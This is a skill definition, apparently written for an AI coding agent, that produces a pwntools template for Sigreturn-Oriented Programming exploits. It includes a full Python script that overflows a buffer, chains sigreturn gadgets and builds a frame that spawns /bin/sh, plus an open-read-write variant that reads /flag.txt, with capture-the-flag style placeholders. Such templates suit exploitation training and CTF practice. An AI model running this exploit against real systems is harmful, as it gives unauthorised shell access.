---
name: pwn-srop
description: Generate SROP (Sigreturn-Oriented Programming) exploit template
argument-hint: "<binary>"
allowed-tools: ["Bash", "Read", "Write"]
---

# PWN SROP - Sigreturn-Oriented Programming Template

Generate an SROP exploit using sigreturn to set up arbitrary register state.

## When to Use SROP

- Limited ROP gadgets available
- Can trigger sigreturn syscall
- Need precise control over all registers
- execve or other syscall-based exploitation

## Generated Template

```python
#!/usr/bin/env python3
"""
SROP Exploit Template
Target: <binary>
Uses sigreturn to set up registers for execve syscall
"""
from pwn import *

# === CONFIGURATION ===
BINARY = './<binary>'
OFFSET = <offset>

# === SETUP ===
elf = ELF(BINARY)
context.binary = elf
context.arch = 'amd64'

def conn():
    if args.REMOTE:
        return remote(args.HOST, int(args.PORT))
    elif args.GDB:
        return gdb.debug(BINARY, '''
            b main
            c
        ''')
    else:
        return process(BINARY)

def main():
    io = conn()

    # === FIND GADGETS ===
    # Need: syscall; ret  OR  int 0x80; ret
    syscall_ret = 0x401234  # TODO: Find in binary

    # Optional: pop rax; ret (to set rax = 15 for sigreturn)
    pop_rax = 0x401235  # TODO: Find in binary

    # === FIND /bin/sh STRING ===
    # Option 1: Use string in binary
    bin_sh = next(elf.search(b'/bin/sh'))

    # Option 2: Use string in libc (after leak)
    # bin_sh = next(libc.search(b'/bin/sh'))

    # Option 3: Write /bin/sh to known location
    # bin_sh = elf.bss() + 0x100

    # === BUILD SIGRETURN FRAME ===
    frame = SigreturnFrame()
    frame.rax = 59          # execve syscall number
    frame.rdi = bin_sh      # filename = "/bin/sh"
    frame.rsi = 0           # argv = NULL
    frame.rdx = 0           # envp = NULL
    frame.rip = syscall_ret # Return to syscall

    # For read/write stack (optional)
    frame.rsp = elf.bss() + 0x200

    # === BUILD PAYLOAD ===
    payload = b'A' * OFFSET

    # Method 1: If we have pop rax gadget
    payload += p64(pop_rax)
    payload += p64(15)          # sigreturn syscall number
    payload += p64(syscall_ret)
    payload += bytes(frame)

    # Method 2: If rax already contains 15 (from read return value)
    # Read exactly 15 bytes, then:
    # payload += p64(syscall_ret)
    # payload += bytes(frame)

    io.sendline(payload)
    io.interactive()

if __name__ == '__main__':
    main()
```

## SROP Syscall Numbers

| Syscall | x86_64 | x86 |
|---------|--------|-----|
| sigreturn | 15 | 119 |
| execve | 59 | 11 |
| read | 0 | 3 |
| write | 1 | 4 |
| open | 2 | 5 |

## Setting RAX = 15

Options to set rax to 15 (sigreturn):
1. `pop rax; ret` gadget + value 15
2. Read exactly 15 bytes (read returns count in rax)
3. Return value of another function
4. Existing gadget that sets rax

## Alternative: ORW SROP

For seccomp-restricted binaries:

```python
# Frame 1: open("/flag.txt", 0)
frame1 = SigreturnFrame()
frame1.rax = 2  # open
frame1.rdi = flag_str_addr
frame1.rsi = 0  # O_RDONLY
frame1.rip = syscall_ret
frame1.rsp = stack_addr + 0x100  # Chain to frame 2

# Frame 2: read(fd, buf, 100)
# Frame 3: write(1, buf, 100)
```
